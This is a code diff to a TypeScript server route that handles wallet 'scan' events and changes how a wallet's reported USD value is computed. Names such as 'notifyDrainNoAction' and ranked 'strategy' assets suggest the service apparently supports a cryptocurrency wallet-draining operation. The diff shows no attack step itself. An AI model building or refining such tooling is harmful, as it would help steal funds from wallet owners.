@@ -380,7 +380,8 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
     } else if (body.event === 'no_action') {
       void notifyDrainNoAction(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
     } else if (body.event === 'scan_complete') {
-      const totalUsd = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
+      const frontendUsd = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
+      let displayUsd = frontendUsd
       let strategyAssets: StrategyAsset[] | undefined
       if (Array.isArray(body.assets) && body.assets.length > 0) {
         strategyAssets = body.assets
@@ -393,11 +394,14 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
             symbol: a.symbol,
             amount_usd: a.amount_usd,
           }))
-      } else if (totalUsd > 0) {
+        const assetsSum = strategyAssets.reduce((s, a) => s + a.amount_usd, 0)
+        if (assetsSum > displayUsd) displayUsd = assetsSum
+      } else if (frontendUsd >= 0) {
         try {
           const family = body.chain_family ?? inferChainFamilyFromWallet(wallet) ?? 'EVM'
           const ranked = await fetchStrategyAssetsForWallet(wallet, family)
           strategyAssets = ranked.assets.length > 0 ? ranked.assets : undefined
+          if (ranked.totalUsd > displayUsd) displayUsd = ranked.totalUsd
         } catch {
           /* optional ranked fallback */
         }
@@ -407,7 +411,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         : (strategyAssets?.length ?? 0)
       void notifyScanComplete(
         wallet,
-        Number.isFinite(totalUsd) ? totalUsd : 0,
+        Number.isFinite(displayUsd) ? displayUsd : 0,
         assetsCount,
         ctx,
         strategyAssets,
